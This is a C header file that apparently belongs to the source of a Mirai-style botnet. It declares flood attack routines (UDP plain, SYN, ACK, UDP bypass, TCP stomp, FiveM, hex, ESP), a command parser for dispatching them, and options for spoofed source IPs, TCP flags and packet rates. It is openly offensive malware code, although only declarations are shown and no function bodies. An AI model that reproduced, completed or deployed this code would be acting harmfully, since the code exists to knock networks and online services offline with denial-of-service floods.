#pragma once

#include "main.h"

#define ATTACKS_MAXPPS  2048
#define ATTACKS_MAXLEN  1400
#define TCP_MAX_SIZE		2048
#define UDP_MAX_SIZE		1500
#define ICMP_STATIC_SIZE	20
#define SYN_MAX_SIZE		1400

#define PROTO_GRE_TRANS_ETH 0x6558

#define PHI 0x9e3779b9
#define MAXSRC 1200000
#define MAX_PACKET_SIZE 4096
static uint32_t S[4096];
static uint32_t x, y, z, w;
static unsigned long int Q[4096], c = 362436;

//TCP Options
#define PROTO_TCP_OPT_NOP 1
#define PROTO_TCP_OPT_MSS 2
#define PROTO_TCP_OPT_WSS 3
#define PROTO_TCP_OPT_SACK 4
#define PROTO_TCP_OPT_SACK_PERM 5
#define PROTO_TCP_OPT_TSVAL 8

typedef void * (* COMMAND_FUNC) ();

struct option
{
    uint8_t id;
    uint16_t val_len;
    char *val;
};

struct target
{
    uint32_t host;
    uint8_t netmask;
};

struct resolve
{
	char *domain;
	uint32_t host;
};

struct command
{
	uint8_t id;
	COMMAND_FUNC func;
};

//
struct arguments
{
	struct target *targets;
	struct option *options;
	uint8_t num_of_flags;
	uint8_t num_of_targets;
	uint16_t time;
};

enum
{
  	FLOOD_UDPPLAIN = 1,
  	FLOOD_SYNPLAIN= 2,
  	FLOOD_ACKPLAIN = 3,
  	FLOOD_UDPBYPASS = 4,
  	FLOOD_TCPSTOMP = 5,
  	FLOOD_UDPFIVEM = 6,
  	FLOOD_SYNACK = 7,
  	FLOOD_UDPHEX = 8,
  	FLOOD_UDPESP = 9,
	COMMAND_COUNT = 10,

	OPT_PORT = 1,
	OPT_SIZE = 2,
	OPT_THREAD_COUNT = 3,
	OPT_HTTP_PATH = 4,
	OPT_HTTP_CONNECTION = 5,
	OPT_DOMAIN = 6,
	OPT_TTL = 7,
	OPT_SOURCE_PORT = 8,
	OPT_ACK = 9,
	OPT_FIN = 10,
	OPT_URG = 11,
	OPT_PSH = 12,
	OPT_RST = 13,
	OPT_SYN = 14,
	OPT_TOS = 15,
	OPT_ID = 16,
	OPT_SEQUENCE = 17,
	OPT_SOURCE_IP = 18,
	OPT_ACK_SEQUENCE = 19,
	OPT_MAXPPS = 20,
	OPT_MINPPS = 21,
	OPT_MAXLEN = 22,
	OPT_MINLEN = 23,
	OPT_PAYLOAD = 24,
	OPT_BIND = 25,
	OPT_RAND = 26,
	OPT_PPS = 27
};

struct command command_list[COMMAND_COUNT];

void command_parse(char *, int);
void init_commands(void);
void flood_tcp_syn(struct arguments *);
void flood_tcp_ack(struct arguments *);
void flood_udp_plain(struct arguments *);
void flood_udp_bypass(struct arguments *);
void flood_tcp_sack(struct arguments *);
void flood_tcp_stomp(struct arguments *);
void flood_udp_hex(struct arguments *);
void flood_udp_fivem(struct arguments *);
void flood_udp_esp(struct arguments *);
uint32_t retrieve_opt_ipv4(struct option *, uint8_t, uint8_t, uint32_t);
uint16_t retrieve_opt_num(struct option *, uint8_t, uint8_t, uint16_t);
uint32_t retrieve_opt_num_long(struct option *, uint8_t, uint8_t, uint32_t);
char *retrieve_opt_str(struct option *, uint8_t, uint8_t, char *);
